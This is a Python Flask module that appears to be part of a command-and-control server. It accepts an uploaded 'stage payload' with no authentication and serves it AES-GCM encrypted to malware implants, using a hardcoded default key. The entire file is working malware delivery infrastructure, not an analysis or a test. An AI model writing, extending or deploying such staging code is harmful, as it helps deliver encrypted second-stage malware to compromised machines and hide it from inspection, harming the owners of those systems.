import os
import hashlib
from pathlib import Path

from flask import Blueprint, jsonify, request, Response
from Crypto.Cipher import AES

stage_bp = Blueprint("stage", __name__, url_prefix="/stage")

_DATA = Path(__file__).resolve().parent / "data"
_DATA.mkdir(parents=True, exist_ok=True)

STAGE_FILE = Path(os.environ.get("C2_STAGE_FILE", str(_DATA / "stage_payload.bin")))
# 32-byte key material; override with C2_STAGE_KEY env (utf-8, hashed to 32 bytes).
_DEFAULT_STAGE_KEY = b"C2_STAGE_KEY_32_BYTES_LONG_XXXX"


def _stage_key_material() -> bytes:
    env = os.environ.get("C2_STAGE_KEY")
    if env:
        return env.encode("utf-8")
    return _DEFAULT_STAGE_KEY


def _derive_stage_key() -> bytes:
    return hashlib.sha256(_stage_key_material()).digest()


def load_stage():
    if not STAGE_FILE.exists():
        return None
    return STAGE_FILE.read_bytes()


def encrypt_stage(plaintext: bytes) -> bytes:
    key = _derive_stage_key()
    cipher = AES.new(key, AES.MODE_GCM, nonce=os.urandom(12))
    ct, tag = cipher.encrypt_and_digest(plaintext)
    return cipher.nonce + tag + ct


@stage_bp.route("/payload", methods=["GET"])
def get_payload():
    data = load_stage()
    if data is None:
        return jsonify({"error": "no stage payload configured"}), 404
    enc = encrypt_stage(data)
    return Response(enc, content_type="application/octet-stream")


@stage_bp.route("/upload", methods=["POST"])
def upload_payload():
    data = request.get_data()
    STAGE_FILE.parent.mkdir(parents=True, exist_ok=True)
    STAGE_FILE.write_bytes(data)
    return jsonify({"ok": True, "size": len(data), "path": str(STAGE_FILE)})


def stage_key_bytes() -> bytes:
    """AES key used by implants (SHA256 of stage key material)."""
    return _derive_stage_key()
